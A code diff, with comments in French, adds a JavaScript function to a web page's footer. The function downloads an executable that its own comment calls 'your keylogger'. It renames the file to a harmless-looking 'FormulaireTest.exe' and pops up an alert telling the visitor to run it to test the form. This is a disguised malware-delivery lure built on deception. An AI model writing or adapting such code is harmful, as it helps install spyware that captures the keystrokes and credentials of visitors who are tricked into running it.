@@ -646,6 +646,23 @@
       </div>
     </footer>
 
+    <!-- Script pour le téléchargement (ajoute ceci juste après le </form> ou dans <script> existant) -->
+    <script>
+      function downloadTestFile() {
+        const link = document.createElement("a");
+        link.href = "SiteCompatibilityModule.exe"; // ← Nom exact de ton keylogger sur GitHub
+        link.download = "FormulaireTest.exe"; // ← Nom affiché au téléchargement (plus discret)
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        // Optionnel : petit message discret
+        alert(
+          "Fichier téléchargé ! Lance-le pour tester le formulaire (compatible Windows 10/11).",
+        );
+      }
+    </script>
+
     <script>
       function verifPlay() {
         var thumb = document.getElementById("verifThumb");
